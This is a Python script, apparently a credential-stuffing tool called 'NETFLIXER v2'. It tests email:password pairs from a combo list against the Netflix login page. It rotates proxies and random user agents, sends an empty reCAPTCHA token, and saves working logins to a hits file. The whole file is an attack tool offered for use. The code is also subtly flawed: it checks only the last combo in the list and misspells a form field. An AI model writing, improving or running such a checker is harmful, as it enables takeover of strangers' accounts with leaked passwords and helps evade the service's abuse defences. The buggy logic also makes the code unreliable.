import os,requests,random
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as Soup

YELLOW = '\033[93m'
GREEN = '\033[32m'
RED = '\033[91m'
RESET = '\033[0m' 

def banner():
    os.system('cls && title [NETFLIXER v2] - Made by Plasmonix' if os.name == "nt" else 'clear') 
    text = """    
                       ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
                       ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
                      ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░    ▒██▒░░  █   ░▒███   ▓██ ░▄█ ▒
                      ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░    ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄  
                      ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
                      ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                      ░ ░░   ░ ▒░ ░ ░  ░   ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░  ░  ░▒ ░ ▒░
                         ░   ░ ░    ░    ░       ░ ░     ░ ░    ▒ ░ ░    ░     ░     ░░   ░ 
                               ░    ░  ░                   ░  ░ ░   ░    ░     ░  ░   ░     """
    faded = ""
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    print(faded)
    print(YELLOW + "                                       github.com/Plasmonix Version 2.0 \n" + RESET)

def load_combo():
    global email,password
    try :
        combolist = open("combo.txt", "r").readlines()
        for combos in combolist:
            email = combos.split(":")[0]
            password=combos.split(":")[1]
        load_proxies()
    except FileNotFoundError :
           print(RED + """ [ERROR] combo.txt not found """ + RESET)

proxies = []
def load_proxies():
    try :
        proxyfile = open("proxies.txt", "r").readlines()
        for proxy in proxyfile:
            ip = proxy.split(":")[0]
            port = proxy.split(":")[1]
            proxies.append({'https': 'http://'+ ip + ':' + port.rstrip("\n")})
        check_account(email,password)
    except FileNotFoundError :
           print(RED + """ [ERROR] proxies.txt not found """ + RESET)

def get_random(data):
    return random.choice(data)

def check_account(email,password):
    client = requests.Session()
    proxy = get_random(proxies)
    login = client.get("https://www.netflix.com/login")
    soup = Soup(login.text,'html.parser')
    loginForm = soup.find('form')
    authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
    
    headers = {
        "user-agent":  UserAgent().random,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        "accept-language": "en-US,en;q=0.9", 
        "accept-encoding": "gzip, deflate, br", 
        "referer": "https://www.netflix.com/login", 
        "content-type": "application/x-www-form-urlencoded",
        "cookie":""
    }

    data = {
        "userLoginId:": (email), 
        "password": (password), 
        "rememberMeCheckbox": "true", 
        "flow": "websiteSignUp", 
        "mode": "login", 
        "action": "loginAction", 
        "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime", 
        "authURL": (authURL), 
        "nextPage": "https://www.netflix.com/browse",
        "countryCode": "+1",
        "countryIsoCode": "US",
        "recaptchaResponseToken": "",
        "recaptchaResponseTime": "473"
    }
    
    try :
        request = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
    except :
        print(RED + " [ERROR] Failed to establish connection" + RESET)
        quit()

    logged = request.text.find('name="authURL"')
    if logged == -1:
        print(GREEN +" [GOOD] " + email + ":" + password.rstrip("\n")+ RESET)
        file = open("hits.txt","a")
        file.write(email + ":" + password)
    else:
        print(RED +" [BAD] " + email + ":" + password.rstrip("\n")+ RESET)

if __name__ == "__main__":
    banner()
    load_combo()
